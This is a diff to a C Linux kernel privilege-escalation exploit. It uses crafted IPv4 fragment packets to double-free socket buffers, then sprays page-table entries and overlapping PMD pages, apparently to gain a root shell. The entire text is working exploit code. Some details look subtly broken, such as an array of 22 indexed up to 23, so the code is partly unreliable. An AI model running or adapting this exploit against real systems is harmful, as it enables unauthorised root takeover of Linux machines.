@@ -36,7 +36,7 @@ static void send_ipv4_ip_hdr_chr(size_t dfsize, struct ip *ip_header, char chr)
 static void trigger_double_free_hdr(size_t dfsize, struct ip *ip_header)
 {
 	printf("[*] sending double free buffer packet...\n");
-	send_ipv4_ip_hdr_chr(dfsize, ip_header, '\x41\xca\xfe\xba');
+	send_ipv4_ip_hdr_chr(dfsize, ip_header, '\x41');
 }
 
 static void alloc_intermed_buf_hdr(size_t dfsize, struct ip *ip_header)
@@ -313,21 +313,25 @@ static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
 		alloc_ipv4_udp(1);
 	}
 
-	//printf("some chill before 1st free");
-	//sleep(1);
-
 	// allocate and free 1 skb from freelist
 	df_ip_header.ip_id = 0x1337;
 	df_ip_header.ip_len = sizeof(struct ip)*2 + 32768 + 24;
 	df_ip_header.ip_off = ntohs((0 >> 3) | 0x2000);  // wait for other fragments. 8 >> 3 to make it wait or so?
 	trigger_double_free_hdr(32768 + 8, &df_ip_header);
-
-	//printf("some chill after 1st free");
-	//sleep(3);
 	
+	// push N skbs to skb freelist
+	for (int i=0; i < CONFIG_SKB_SPRAY_AMOUNT; i++)
+	{
+		PRINTF_VERBOSE("[*] freeing reserved udp packets to mask corrupted packet... (%d/%d)\n", i, CONFIG_SKB_SPRAY_AMOUNT);
+		recv_ipv4_udp(1);
+	}
 
-	//printf("[*] SLEEP 1s before double free...\n");
-	//sleep(1);
+	// spray-allocate the PTEs from PCP allocator order-0 list
+	printf("[*] spraying %d pte's...\n", CONFIG_PTE_SPRAY_AMOUNT);
+	for (unsigned long long i=0; i < CONFIG_PTE_SPRAY_AMOUNT; i++)
+		*(char*)PTI_TO_VIRT(2, 0, i, 0, 0) = 0x41;
+
+	PRINTF_VERBOSE("[*] double-freeing skb...\n");
 
 	// cause double-free on skb from earlier
 	df_ip_header.ip_id = 0x1337;
@@ -340,10 +344,8 @@ static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
 	alloc_intermed_buf_hdr(0, &df_ip_header);
 
 	// allocate overlapping PMD page (overlaps with PTE)
-	//printf("[*] SLEEP 1s after double free...\n");
-	//sleep(1);
-	void *_pmd_area1[22];
 	*(unsigned long long*)_pmd_area = 0xCAFEBABE;
+	void *_pmd_area1[22];
 	for (int i=2; i < 24; i++){
 		_pmd_area1[i] = mmap((void*)PTI_TO_VIRT(1, i, 0, 0, 0), 0x400000, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, -1, 0);
 		*(unsigned long long*)_pmd_area1[i] = 0xCAFEBABA;
